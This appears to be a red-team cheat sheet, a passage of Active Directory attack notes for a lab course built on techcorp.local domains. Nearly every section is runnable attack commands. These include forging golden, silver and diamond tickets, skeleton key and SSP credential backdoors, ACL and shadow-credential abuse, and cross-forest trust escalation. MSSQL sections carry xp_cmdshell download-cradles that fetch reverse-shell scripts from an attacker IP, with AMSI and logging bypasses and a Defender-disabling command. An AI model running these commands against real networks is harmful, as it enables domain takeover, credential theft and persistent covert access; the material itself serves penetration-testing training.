Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden_tkt.kirbi"'

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

# Use Golden Ticket to gain RCE on DC
klist
Enter-PSSession -ComputerName us-dc
```

#### Silver Ticket

```powershell
# Comman Attack Scenario, if you have TGT of machine account...Then Silver Ticket can b ecrafted to one of the services as CIFS, HOST, HTTP etc and gain RCE on the system

# Fetch the NTLM hash of the machine account US-DC$
Invoke-Mimi -Command '"lsadump::dcsync /user:us\US-DC$"'
f4492105cb24a843356945e45402073e

# Craft a silver ticket for CIFS service on DC using DC$ machine account NTLM hash
Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:CIFS /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:CIFS /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

ls \\us-dc.us.techcorp.local\c$

# Craft HOST service ticket
Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Use Scheduled task to get RCE on DC via HOST Service
schtasks /create /S us-dc.us.techcorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck41" /TR "powershell.exe -c 'iex (iwr http://192.168.100.41:8080/dakiya.ps1  -UseBasicParsing); reverse -Reverse -IPAddress 192.168.100.41 -Port 8081'"

.\nc64.exe -lvp 8081
powercat -l -v -p 443 -t 1000

schtasks /Run /S us-dc.us.techcorp.local /TN "STCheck41"

NOTE: HOST - Scheduled Task | HOST + RPCSS - PowerShell remoting & WMI | LDAP - DCSync | WSMAN | CIFS

```

#### Diamond Ticket

```powershell
# Instead of creating completely forged ticket, it fetches valid TGT and modifies required attributes 

# Request TGT for StudentUserX and modify the parameters to create a diamond ticket
Rubeus.exe diamond
/krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
/user:studentuserx /password:studentuserxpassword /enctype:aes
/ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local
/ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show
/ptt

# Use /tgtdeleg if we have access as domain user and its TGT is already cached
Rubeus.exe diamond
/krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
/tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.techcorp.local
/dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512
/createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


#### Skeleton Key

```powershell
# Once set, Allows any user to Login using 'mimikatz' as password for any useraccount
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName us-dc

# If lsass is running as protected process
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

#### DSRM Account

```powershell
# Directory Services Restore Mode (DSRM), is the local Administrator whose password is configured as SafeModePassword. it is stored in SAM file and not ntds.dat file 

# Dump the local account credentials from sam file (having local DSRM account) 
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computer us-dc

# Adminsitrator hash for DA stored in ntds.dat file can be fetched using below command
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername us-dc

# Login is not allowed by DSRM Account, requires regitry changes
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD

# Login using PTH
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:us-dc /user:Administrator /ntlm:acxs /run"powershell.exe"'

ls \\us-dc\c$
Enter-PSSession -ComputerName us-dc -Authentication Negotiate
```

#### Custom SSP

```powershell
# Custom SSP, once injected in the lsass memory would log the username and password in clear text  
Invoke-Mimikatz -Command '"misc::memssp"'

# Logs are stored to
C:\Windows\system32\kiwissp.log
```

#### Admin SDHolder

```powershell
# Resides in System Container of domain and maintains permission for Protected Groups
# Uses Security Descriptor Propagator (SDPROP) every hour and compares the ACL of protected groups & its members with ACL defined in AdminSDHolder and any differences are overwritten

# Set generic all rights to our specified principal 
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Right All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose

# Other interesting permissions include (ResetPassword, WriteMembers)

# Trigger the SDPropagation
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -verbose

```

#### ACL Abuse Scenarios

```powershell

>> CASE 1: Modify right on Domain Admins group

# Step 1. Check if one of the pricipals we control has any rights on Domain Admin group
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentuserSID"}

# Stp 2.  Above Privilege can be abused by adding members to Domain Admin Group
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

>> CASE 2: Exploiting ResetPassword rights on Domain User Account

# Step 1. Change Password of user account if there is any resetpassword rights using powerview
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -verbose

>> CASE 3: DCSync rights on user account

# CASE 3.1: Check for presence of DCSync Right to any pricipal in domain
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType -match 'repl' -and $_.SecurityIdentifier -match 'S-1-5-21-210670787-2521448726-163245708'}  | select ObjectDN,  ObjectAceType, SecurityIdentifier

Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuserx"}

# Case 3.2: Assign full rights or DCSync on the domain where we have modify right on user account
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser1 -Right All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose

Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser1 -Right DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -verbose


>> CASE 4: If there is Generic Write attribute available on Computer Object, then we can use 'RBCD' attack
>> CASE 5: If there is WriteProperty on User Account, the we can inject 'Shadow credentials' using whishker

>> CASE 6: Enable kerberosting, ASEPRoasting and Delegation if we have write access to user account
Set-DomainObject -Identity devuser -Set @{serviceprincipalname ='dev/svc'
Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegatetoallowedtodelegateto"="ldap/us-dc.us.techcorp.local"}
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}

```

#### ACL - Security Descriptors

```powershell
# Assign remote access to non-admin user by modifying the ACL for remote access services as WMI and PSRemoting on specific host. The Security Descriptor in ACLs is made of below syntax:
# ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
# A;CI;CCDCLCSWRPWPRCWD;;;SID

- RACE Toolkit can be used for abuse ACL and apply a backdoor for non-admin user access

# Load RACE toolkit
. C:\AD\Tools\RACE\master\RACE.ps1

# Set backdoor on loal system or specified system (WMI and Powershell)
Set-RemoteWMI -SamAccountName studentuser1 -Verbose
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName US-DC -Verbose
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Credential Administrator -namespace 'root\cimv2' Verbose

Set-RemotePSRemoting -SamAccountName studentuser1 -Verbose
Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc Verbose

# Remove the permission
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Remove
Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc -Remove

# Using RACE or DAMP Toolkit to registry based backdoor
Add-RemoteRegBackdoor -ComputerName us-dc -Trustee studentuser1 -Verbose

# Set backdoor to retrive Machine Account Hash, Local Account Hash or Cached Credentials remotely
Get-RemoteMachineAccountHash -ComputerName us-dc Verbose
Get-RemoteLocalAccountHash -ComputerName us-dc Verbose
Get-RemoteCachedCredential -ComputerName us-dc Verbose
```


#### Shadow Credentials

```powershell
# User and Computer where we have write permission, we can inject shadow credentials (certificate in msDS-KeyCredentialLink attribute that which acts alternate credentials). Used by Windows Hello for Bussiness

>> CASE I: Shadow Credentials Attack for User Account 

# Step 1. Identify the User Object having Write/GenricAll permission
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}

# Step 2. Login as princiapl having right to modify the properties of target user (RunAs/PTH)

# Step 3. Use Whishker tool to modify the target user account and add cerificate backdoor
Whisker.exe add /target:support41user

# Step 4. Verify if the certificate has been added to msDS-KeyCredentialLink attribute of target user
Get-DomainUser -Identity supportXuser

# Step 5. Use Rubeus to inject TGT and fetch NTLM hash of target user
Rubeus.exe asktgt /user:supportXuser /certificate:xyz== /password:"1337" /domain:us.techcorp.local
/dc:US DC.us.techcorp.local /getcredentials /show /nowrap /ptt


>> CASE II: Shadow Credentials Attack for Machine Account 

# Step 1. Identify the Computer Object having Write/GenricAll permission
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "mgmtadmin"}

# Step 2. Login as princiapl having right to modify the properties of target user (RunAs/PTH)
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe" "exit"

# Step 3. Use Whishker tool to modify the target user account and add cerificate backdoor
Whisker.exe add /target:us-helpdesk$

# Step 4. Verify if the certificate has been added to msDS-KeyCredentialLink attribute of target user
Get-DomainComputer -Identity us-helpdesk

# Step 5. Use Rubeus to inject TGT and fetch NTLM hash of target user
Rubeus.exe asktgt /user:us-helpdesk$ /certificate:xyz== /password:"1337" /domain:us.techcorp.local
/dc:US-DC.us.techcorp.local /getcredentials /show /nowrap /ptt

Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:xyz== /impersonateuser:administrator /ptt /self
/altservice:cifs/us-helpdesk
```


#### Azure AD Connect

```powershell

# Step 1. Identify the AD Connect user account and machine for syncing the hash between On-prem and Azure AD
Get-DomainUser -Identity MSOL* -Domain techcorp.local | select -ExpandProperty description

# Step 2. Get access to the server identified in the description via helpdesk user (admin)
.\SafetyKatz.exe "sekurlsa::pth /user:helpdeskadmin /domain:us.techcorp.local /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /run:powershell.exe" "exit"

# Load & execute the ADconnect.ps1 script to fetch the plain text password for MSOL_* user
iwr http://192.168.100.41:8080/adconnect.ps1 -O adconnect.ps1
. .\adconnect.ps1
adconnect

Domain: techcorp.local
Username: MSOL_16fb75d0227d
Password: 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf

# Open the netonly session for above user 
runas /netonly /user:MSOL_16fb75d0227d cmd.exe

# Now, perform DCSync attack to fetch the secrets from DC
C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local
```


## Cross Domain Attacks


#### Intra-Forest Privilege Escalation (Child [us.techcorp.local] -> Parent [techcorp.local])

##### CASE 1: Using Trusted Domain Object (TDO) + SID Histroy

```powershell
# Step 1. fetch the Trust Key (Inward) using one of the following method from child DC
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName us-dc
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName us-dc

# Step 2. Forge Inter-Realm Trust Ticket 
Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726 163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:189517f6dde94659c0aacf1674e46765 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"' 

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:9fb9e247a02e6fde1631efa7fedce6a2 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"

# Step 3. Inject the TGT in memory and Use Rubeus to request TGS for CIFS Service on Parent-DC
Invoke-Mimikatz -Command '"kerberos::ptt trust_tkt.kirbi"'

# Step 4. Use TGT to fetch TGS for CIFS Servie on Parent DC
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt

# Step 5. Access the service
ls \\techcorp-dc.techcorp.local\c$
```

##### CASE 2: Using KRBTGT account hash of Child Domain + SID History

```powershell
# Step 1. fetch the ntlm hash of krbtgt account in child domain
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'

# Step 2. Forge the golden ticket with  Trust key 
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'

C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt" "exit"

# Step 4. Access the service
ls \\techcorp-dc.techcorp.local\c$
Enter-PSSession techcorp-dc.techcorp.local

# Alternately, we can use DC group SID (516) for crafting forged ticket and then perform DCSync
Invoke-Mimikatz -Command '"kerberos::golden /user:us-dc$ /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:516 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /ptt"'

Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\Administrator /domain:techcorp.local"'
```


#### Inter-Forest Attack - Regular Domain Based Attacks

```powershell

>> Kerberost Across Forest Trust
# Note: Enumeration of domain is possible in case of Inound Trust 
Get-DomainUser -SPN -Domain eu.local | select name, serviceprincipalname

.\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt

C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\euhashes.txt


>> Constrained Delegation Across Forest Trust
# Note: Requires access to the user/machine account having Constrained Delegation enabled

# Step 1.Identofy the user and service where constrained delgation is allowed
Get-DomainUser -TrustedToAuth -Domain eu.local  | select samaccountname,msds-allowedtodelegateto

# Step 2. Calculate the NTLM hash from the user password
.\Rubeus.exe hash /password:Qwerty@123 /domain:eu.local /user:storagesvc

# Step 3. Execute S4U attack to fetch the TGS for CIFS service as Admin on EU-DC
.\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /msdsspn:"time/EU-DC.eu.local" /altservice:CIFS /domain:eu.local /dc:eu-dc.eu.local /ptt

# Step 4. Access the service
ls \\eu-dc.eu.local\c$


>> Unconstrained Delegation
#Note: Only works if Two-way trust is enabled with TGT Delegation enabled (disabled by default). There is no way to know if TGT delegation is allowed across forest without logging onto the target forest DC and leverage netdom command or AD Module. We can directly attempt the PrintSpool attack and see if it works!

# Step 1. Enumerate if TGT Delegation is enabled across forest trust (only possible from target Domain DC)
netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation

# Step 2. Login to machine in current domain having Unconstrained Delegation (us-web)
.\SafetyKatz.exe "sekurlsa::pth /user:webmaster /domain:us.techcorp.local /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /run:powershell.exe" "exit"

winrs -r:us-web powershell

# Step 3. Execute Rubeus to monitor the TGT on us-web
.\Rubeus.exe monitor /interval:5 /nowrap

# Step 4. Trigger PrintSpool attack (form student vm)
.\MS-RPRN.exe \\euvendor-dc.euvendor.local \\us-web.us.techcorp.local

# Step 5. Import the ticket in memory
.\Rubeus ptt /ticket:xyz==

# Step 6. Perform DCSync attack
Invoke-Mimikatz -Command '"lsadump::dcsync /user:administrator /domain:usvendor.local /dc:usvendor-dc.usvendor.local"'
C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local

```

#### Inter-Forest Attack - SID History enabled (eu->euvendor) ]

```powershell

# Retrive domain trust account hash 
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computer eu-dc.eu.local
5cc0d1e3f17b532a70d5826843af74e1

# Current domain SID
Get-DomainSid
S-1-5-21-3657428294-2017276338-1274645009

# Target Domain SID
Get-DomainSid -Domain euvendor.local
S-1-5-21-4066061358-3942393892-617142613

# Group ID which needs to be impersonated as it has RID > 1000
Get-DomainGroup -Identity Euadmins  -domain euvendor.local
S-1-5-21-4066061358-3942393892-617142613-1103

# Create Golden Ticket for User having RID> 1000 as any SID <1000 (DA,EA) will be filtered
Invoke-Mimikatz -Command '"kerberos::golden /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /rc4:5cc0d1e3f17b532a70d5826843af74e1 /user:Administrator /service:krbtgt /target:euvendor.local /ticket:C:\eu_trust_tkt.kirbi"' 

# Request CIFS TGS ticket for share on DC using TGT genereatd above
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\eu_trust_tkt.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

# Once we have access as the normal user on target domain, we can enumerate for local admin rights on other server in domain as "euvendor-net.euvendor.local" 
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\eu_trust_tkt.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

# Invoke command using Powershell remoting
winrs -r:euvendor-net.euvendor.local hostname

Invoke-Command -ScriptBlock {whoami} -ComputerName euvendor-net.euvendor.local -Authentication NegotiateWithImplicitCredential

NOTE: if 'SIDFilteringForestAware' and 'SIDFilteringQuarantined' is set to 'False', then it wont be possible to use forged inter-realm TGT impersonating RID > 1000.
```

#### Inter-Forest Attack - Abusing PAM Trust

```powershell

# PAM Trust is enabled between red/bastion forest and Production Forest using Shadow credentials. These credentials are created in Basion domain and mapped with DA/EA group of production forest

# Check for Foreign Security Pricipal (Group/User) in Target Forest (bastion) from techcorp.local
Get-ADTrust -Filter * 
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
Get-DomainObject -domain bastion.local | ?{$_.objectclass -match "foreignSecurityPrincipal"} 

# Gain Access to Basion-DC (use ntlm auth)
 .\SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:bastion.local /dc:bastion-dc.bastion.local /rc4:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe" "exit"

# On basion-dc, enumerate if there is a PAM trust by validating below 2 conditions for given trust
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
Get-DomainTrust

# It can also be verified by presence of shadow pricipal conatiner
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter *  -Properties *| select Name,member,msDS-ShadowPrincipalSid

Get-DomainObject -Searchbase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local"

# Find the IP address of production-dc using DNS Query or Ping command
Get-DNSServerZone -Zonename production.local | fl *

# Enable Trusted Host configuration for WinRM from Admin shell
Set-Item WSMan:\localhost\Client\TrustedHosts *

# Connect with remote system
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential

```


#### MSSQL DB Attacks

```powershell
# Import PowerUpSql
Import-Module .\PowerupSQL-master\PowerupSQL.psd1
iex (iwr https://192.168.100.X/PowerUpSQL.ps1 -UseBasicParsing)

# Scan for MSSQL DB Installation by SPN Search
Get-SQLInstanceDomain
Get-SQLInstanceDomain -Instance dcorp-mssql.organicsecurity.local

# Check if the current logged-on user has access to SQL Database
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | SQLConnectionTestThreaded

# Gather more info about identified db
Get-SQLInstanceDomain | Get-SQLServerInfo

# Scan for MSSQL misconfigurations to escalate to SA  
Invoke-SQLAudit -Verbose -Instance TARGETSERVER

# Execute SQL query  
Get-SQLQuery -Query "SELECT system_user" -Instance TARGETSERVER

# Check for presence of DB Link
Get-SQLServerLink -Instance dcorp-mssql.organicsecurity.local

# Crawl the DB Link to enecute command, choose specific system via QueryTarget parameter
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local 
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local  -Query "exec master..xp_cmdshell 'whoami'"
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local  -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget db-sqlsrv

# Take reverse shell from DB
Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'EXEC master..xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1'')"' -QueryTarget db-sqlsrv | select instance,links,customquery | ft

# Take reverse shell from DB (BypassLogging & AV detection)
Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'EXEC master..xp_cmdshell ''powershell.exe -c "iex (iwr -UseBasicParsing http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv | select instance,links,customquery | ft

Get-SqlServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'EXEC master..xp_cmdshell ''powershell.exe -c "iex (iwr -UseBasicParsing http://192.168.100.41:8080/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.41:8080/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.41:8080/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv 

# Run command (enables XP_CMDSHELL automatically if required)  
Invoke-SQLOSCmd -Instance TARGETSERVER -Command "whoami" | select -ExpandProperty CommandResults

# Enable rpc and rpcout on DB-SQLSRV (may require to run it twice)
Invoke-SQLCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"

# DB Query to enable XP_CMDSHELL
Invoke-SQLCmd -Query "EXECUTE('sp_configure ''show advanced options'', 1; reconfigure') AT ""db-sqlsrv"""
Invoke-SQLCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure') AT ""db-sqlsrv"""

# Use specific credentials to query db
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

# Check for Impersonation attack
Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug -Exploit

Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''

# Impersonate user and execute db query
Get-SQLQuery -Query "EXECUTE AS LOGIN = 'sqladmin';  select system_user" -Instance sqldb.organicsecurity.local

Get-SQLQuery -Query "EXECUTE AS LOGIN = 'sqladmin'; EXECUTE AS LOGIN = 'sa';  select system_user" -Instance sqldb.organicsecurity.local

# Execute OS level command by impersonating the user
Get-SQLQuery -Query "EXECUTE AS LOGIN = 'sqladmin';  EXECUTE AS LOGIN = 'sa'; exec master..xp_cmdshell 'powershell -c ''Set-MpPreference -DisableRealtimeMonitoring $true'''" -Instance sqldb.organicsecurity.local

```


#### Reference:
https://github.com/0xJs/CRTE-Cheatsheet/blob/main/README.md
https://www.alteredsecurity.com/redteamlab





